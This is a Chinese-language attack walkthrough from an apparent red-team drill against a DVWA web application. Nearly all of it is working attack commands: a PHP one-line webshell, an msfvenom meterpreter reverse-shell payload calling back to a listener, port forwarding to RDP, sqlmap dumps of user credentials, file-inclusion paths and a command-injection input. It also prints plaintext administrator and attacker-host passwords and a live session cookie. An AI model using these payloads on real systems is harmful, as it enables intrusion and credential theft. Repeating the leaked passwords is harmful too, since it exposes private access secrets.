# acermis攻防演練

透過php一句話木馬取得systeminfo資訊

<?php system($_GET['cmd']); ?>

![Untitled](acermis%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%2091bc9484ba10405eafc830a37bddda73/Untitled.png)

## 一、二、透過上傳漏洞進行攻擊

(取得資敏資料、取得遠端桌面連線)

透過以下指令產生php後門(test.php可以更換名稱)

msfvenom -p php/meterpreter/reverse_tcp lhost=61.219.51.40 lport=4444 -o test.php

![Untitled](acermis%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%2091bc9484ba10405eafc830a37bddda73/Untitled%201.png)

![Untitled](acermis%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%2091bc9484ba10405eafc830a37bddda73/Untitled%202.png)

上傳後，到uploads資料夾下面確認檔案成功

![Untitled](acermis%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%2091bc9484ba10405eafc830a37bddda73/Untitled%203.png)

到駭客攻擊主機上啟用listener

msfconsole

use exploit/multi/handler

set payload php/meterpreter/reverse_tcp

set lhost 192.168.0.2

set lport 4444

exploit

設定好之後，到dvwa上面執行php的後門程式，成功連到攻擊者主機

![Untitled](acermis%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%2091bc9484ba10405eafc830a37bddda73/Untitled%204.png)

拿到meterpreter後，透過cd指令，切換到以下路徑

C:\Windows\system32\drivers\etc\hosts

![Untitled](acermis%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%2091bc9484ba10405eafc830a37bddda73/Untitled%205.png)

![Untitled](acermis%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%2091bc9484ba10405eafc830a37bddda73/Untitled%206.png)

將檔案下載回本地

download hosts /home/kali/

![Untitled](acermis%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%2091bc9484ba10405eafc830a37bddda73/Untitled%207.png)

再meterpreter模式下，設定port forward

portfwd add -l 3389 -p 3389 -r 127.0.0.1

透過xfreerdp進行遠端桌面連線

xfreerdp /u:administrator /v:127.0.0.1

密碼如下：

!Sf=pj6P.twmYi78))vOuHFGEfL)TVF5

![Untitled](acermis%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%2091bc9484ba10405eafc830a37bddda73/Untitled%208.png)

## 三、sql injection

### 確定security level是low

![Untitled](acermis%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%2091bc9484ba10405eafc830a37bddda73/Untitled%209.png)

## 進入sql injection頁面，輸入1後送出

[http://54.178.18.190/dvwa/vulnerabilities/sqli/](http://54.178.18.190/dvwa/vulnerabilities/sqli/)

![Untitled](acermis%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%2091bc9484ba10405eafc830a37bddda73/Untitled%2010.png)

### 將目前的url, cookie都準備好，準備執行sqlmap

![Untitled](acermis%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%2091bc9484ba10405eafc830a37bddda73/Untitled%2011.png)

sqlmap -u "[http://54.178.18.190/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#](http://54.178.18.190/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#)" --cookie="security=low; PHPSESSID=m58dtec2sc93gn36qd4as5eirc"

列出所有的db

sqlmap -u "[http://54.178.18.190/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#](http://54.178.18.190/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#)" --cookie="security=low; PHPSESSID=m58dtec2sc93gn36qd4as5eirc" -dbs

![Untitled](acermis%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%2091bc9484ba10405eafc830a37bddda73/Untitled%2012.png)

列出dvwa裡面所有的tables

![Untitled](acermis%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%2091bc9484ba10405eafc830a37bddda73/Untitled%2013.png)

列出users裡面所有的cloumns

![Untitled](acermis%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%2091bc9484ba10405eafc830a37bddda73/Untitled%2014.png)

將使用者帳號密碼dump出來

![Untitled](acermis%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%2091bc9484ba10405eafc830a37bddda73/Untitled%2015.png)

## 四、透過LFI取得windows機敏資訊

進入file inclusion頁面，將page後的檔案名稱換成以下windows路徑檔案

C:\windows\system32\drivers\etc\hosts　#域名解析文件

![Untitled](acermis%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%2091bc9484ba10405eafc830a37bddda73/Untitled%2016.png)

## 五、透過command injeciton取的windows systeminfo資訊

進入command injection頁面，輸入正常input

![Untitled](acermis%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%2091bc9484ba10405eafc830a37bddda73/Untitled%2017.png)

將input改為127.0.0.1 & systeminfo

取得系統詳細資訊，如果是正式主機，可以取得DC的相關資訊進行更近一步攻擊

![Untitled](acermis%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%2091bc9484ba10405eafc830a37bddda73/Untitled%2018.png)

---

參考資料

攻擊者主機：

192.168.0.4

icd450

1qaz@WSX

裡面vm有一個kali, ip是192.168.0.2

---

!Sf=pj6P.twmYi78))vOuHFGEfL)TVF5

C:\Windows\system32\drivers\etc\hosts

portfwd add -l 3389 -p 3389 -r 127.0.0.1
xfreerdp /u:administrator /v:127.0.0.1

!Sf=pj6P.twmYi78))vOuHFGEfL)TVF5

---

**windows**

- C:\windows\system32\drivers\etc\hosts　#域名解析文件
- C:\windows\repair\sam　#存windows用户的密码
- C:\boot.ini　#保存有系统的启动信息

Linux

/etc/passwd　　#用户配置文件
/etc/shadow　　#影子文件
/etc/resolv.conf　　#DNS客户机配置文件
/etc/network/interfaces　　#debian系列IP配置文件
/etc/sysonfig/network-scripts/ifcfg-ethx　　#redhat系列IP配置文件